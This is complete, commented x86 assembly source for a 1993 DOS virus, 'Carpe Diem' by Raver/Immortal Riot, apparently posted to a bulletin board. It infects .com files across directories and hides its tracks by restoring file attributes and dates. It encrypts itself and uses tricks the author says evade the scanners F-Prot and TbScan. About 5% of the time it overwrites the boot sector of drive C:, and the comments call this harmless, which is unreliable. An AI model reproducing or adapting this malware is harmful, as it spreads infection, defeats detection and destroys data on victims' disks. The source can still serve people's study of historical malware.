; Well this is my (Raver's) first scratch virus.
; This virus is mainly made for educational purpose (my own!).
; It's pretty well commented in an easy way so even you folks
; with little experience with assembler should be able to follow
; the code!

; It's a pretty simple non-overwriting .com-infector with a harmless
; nuking routine. It clears and restores the file attributes and
; date/time stamp and finds and infects files using the dot-dot method.
; An encryption routine and some "unusual" instructions are included to
; avoid detection by the common virus scanners. At release date, see
; above, neither F-prot nor Tb-scan found traces of virus code!

; There is about a 5 percent chance that the nuking routine will be
; activated, it checks the system time for 1/100 of a second. If it's
; activated it'll overwrite the first sector on the fixed disk (c:)
; which contains the boot sector. This might seem cruel but, infact,
; it's quite harmless 'cause norton utilities and other programs
; easily restore the boot sector. It's there just to make inexperienced
; users (lamers!) nervous!

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                    CARPE DIEM! - Seize the day
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

cseg	segment byte public 'code'
        assume cs:cseg, ds:cseg

	org 100h

start_of_virus:			;entry point
    call get_off		;this somewhat unusual code won't
get_off:			;produce a flexible entry point flag
    mov si,sp			;get the delta offset
    mov bp,word ptr ss:[si]	;offset is on top of stack
    sub bp,offset get_off	;put it in bp
    inc sp			;restore sp to it's original
    inc sp

;    call encrypt_decrypt	;decrypt the contents of the program
    mov ax,bp			;use alternative code - otherwise
    add ax,116h			;f-prot will recognize it as Radyum!!!!
    push ax
    jmp encrypt_decrypt
    jmp encrypted_code_start	;jmp to the (en/de)crypted virus area


encryption_value dw 0		;random value for encryption routine


write_virus_to_file:		;proc to append virus code to file

    call encrypt_decrypt	;encrypt the virus before write

    mov cx,offset end_of_virus-100h	;length of virus to be written
    lea dx,[bp]				       ;write from start
    mov ax,word ptr [bp+end_of_virus+1ah+2]    ;most significant part of
    inc ah				       ;file length in DTA. Is
    add dx,ax				       ;always 0 in .com-files.
    mov ah,40h				       ;Use this trick to fool
    int 21h				       ;heuristic searches.
					       ;dx = delta offset+100h
    call encrypt_decrypt		       ;decrypt the code for
    ret					       ;further processing.


encrypt_decrypt:			    ;proc to (en/de)crypt the code
    mov dx,word ptr [bp+encryption_value]   ;use random number for every
    lea si,[bp+encrypted_code_start]	    ;new infection
    mov cx,(end_of_virus-encrypted_code_start+1)/2

crypt_loop:				    ;xor the whole virus code
    xor word ptr [si],dx		    ;between encrypted_code_start
    add si,2				    ;and end_of_virus
    loop crypt_loop

    ret

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;  Here the part that will be encrypted starts, i.e. all code
;  except the encryption routine and the routine to append virus
;  to file.
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

encrypted_code_start:

    cld

    mov ah,1ah			;Set DTA Transfer area to after
    lea dx,[bp+end_of_virus]	;after the end of file to save file
    int 21h			;size. Note: do not use default 80h
				;as DTA area since the parameters to
				;the "real" program will be overwritten!

    lea si,[bp+orgbuf]		;Transfer buffer contents
    lea di,[bp+orgbuf2]		;to be restored to the beginning
    mov cx,2			;for restart of the "real" program
    rep movsw

    mov di,2			;Infection counter, 2 files every run

    mov ah,19h			;get current drive
    int 21h
    cmp al,2			;check if a: or b:
    jae get_cur_dir		;if so, skip infection. Otherwise
    jmp no_more_files		;the user will most likely get
				;quite suspicious
get_cur_dir:
    mov ah,47h			    ;get starting directory
    xor dl,dl			    ;it will be changed by the
    lea si,[bp+end_of_virus+2ch]    ;dot-dot method later on
    int 21h

find_first:			;start finding the first .com file
    mov cx,7			;in every new dir
    lea dx,[bp+filespec]
    mov ah,4eh
    int 21h
    jnc clear_attribs		;successive?

    call ch_dir			;no more files in dir. change dir
    jmp find_first		;start over again
				;otherwise jmp

find_next:			;this is the upper point of the find
    mov ah,4fh			;files loop in a dir
    int 21h
    jnc clear_attribs

    call ch_dir			;no more files in dir. change dir
    jmp find_first		;start over again

clear_attribs:			;set the file attribute to 0
    mov ax,4301h
    xor cx,cx
    lea dx,[bp+end_of_virus+1eh]
    int 21h

open_file:			;open file to be infected
    mov ax,3d02h
;    lea dx,[bp+end_of_virus+1eh]   ;since clear_attribs
    int 21h

    xchg ax,bx			;Put file handle in bx

read_file:			;read first four bytes of file
    mov ah,3fh			;They will be restore to the start
    mov cx,4			;after the virus is finnished
    lea dx,[bp+orgbuf]		;so the program can execute
    int 21h

check_already_infected:		;check the first to bytes and check
    mov si,dx			;if the file is already infected
    lea si,[bp+orgbuf]
    cmp word ptr [si],0e990h
    je already_infected		;if so, jmp

    cmp word ptr [bp+end_of_virus+35],'DN'  ;check if command.com
    jz already_infected			    ;if so, don't infect

    mov ax,word ptr [bp+end_of_virus+1ah]   ;check file size
    cmp ax,500				    ;and skip short and
    jb already_infected			    ;long files
    cmp ax,64000
    ja already_infected


    mov ax,4202h		;get lenght of initial jmp in ax
    xor cx,cx
    xor dx,dx
    int 21h

    sub ax,4			;subtract the first four bytes, which
				;will be overwritten 

    mov word ptr [bp+startbuf],0e990h	    ;load the buffer with a nop
    mov word ptr [bp+startbuf+2],ax	    ;and a jmp to virus beginning
					    ;notice the reversed order!

    mov ax,4200h		;move to beginning of file
    int 21h

    mov ah,40h			;write the new instructions
    mov cx,4
    lea dx,[bp+startbuf]
    int 21h

    mov ax,4202h		;move to end of file
    xor cx,cx
    xor dx,dx
    int 21h

    mov ah,2ch				    ;get a random number from
    int 21h				    ;system clock for the
    mov word ptr [bp+encryption_value],dx   ;encryption routine
    call write_virus_to_file		    ;append the virus code
    jmp restore_time_date

already_infected:			    ;if already encrypted increase
    inc di				    ;infection counter with one

restore_time_date:			    ;restore file time & date
    lea si,[bp+end_of_virus+16h]
    mov cx,word ptr [si]
    mov dx,word ptr [si+2]
    mov ax,5701h
    int 21h

close_file:				    ;close the file handle
    mov ah,3eh
    int 21h

set_old_attrib:				    ;restore the old file attrib
    mov ax,4301h
    xor ch,ch
    mov cl,byte ptr [bp+end_of_virus+15h]
    lea dx,[bp+end_of_virus+1eh]
    int 21h

    dec di				    ;decrease infection counter
    cmp di,0				    ;and check if infection is
    jbe no_more_files			    ;completed
    jmp find_next

no_more_files:

    mov ah,2ch				    ;get a new random number
    int 21h				    ;5% chance of nuke
    cmp dl,5
    ja restore_start			    ;above 5 no nuke

    mov ax,0301h			    ;trash the bootsector of c:
    mov cx,0001h			    ;This might seem cruel but
    mov dx,0080h			    ;norton and other programs
    lea bx,[bp+start_of_virus]		    ;easily fix it. It's just
    int 13h				    ;to make the user nervous!!

    mov ah,09h				    ;deliver a message too
    lea dx,[bp+signature]
    int 21h


restore_start:				    ;copy the four saved bytes to
    lea si,[bp+orgbuf2]			    ;beginning of file in memory
    mov di,100h
    movsw
    movsw


restore_dir:				    ;change back to original
    lea dx,[bp+end_of_virus+2ch]	    ;dir
    mov ah,3bh
    int 21h

exit_proc:				    ;return to start of program
    mov bx,100h				    ;This will be enrypted in
    push bx				    ;infected files, so anti-vir
					    ;progs won't complain.
    xor ax,ax				    ;for org virus to push on
    retn				    ;the stack for ret


ch_dir:
    lea dx,[bp+dot_dot]	    ;use dot-dot method
    mov ah,3bh
    int 21h
    jnc no_err		    ;sub dir existed
    pop ax		    ;otherwise all files are checked. exit!
    jmp no_more_files	    ;pop the ip pointer from the stack
no_err:			    ;and jump to the end part
    ret

signature db "CARPE DIEM! (c) '93 - Raver/Immortal Riot",0ah,0dh,'$'
country   db " Sweden 16/11/93"
filespec db '*.com',0
dot_dot db '..',0
orgbuf db 90h,90h,50h,0c3h		    ;instructions to exit the
orgbuf2 db 4 dup(0)			    ;scratch after infection
startbuf db 4 dup(0)			    ;nop,nop,push ax,ret
end_of_virus:
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;  The virus code ends here but the point below here (the heap)
;  is used to store temporary variables such as the dta-area and
;  the starting directory
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
cseg	ends
	end start_of_virus
 
... Sorry, the Dog ate my Blue Wave packet.
___ Blue Wave/QWK v2.12

--- Oblivion/2 2.10

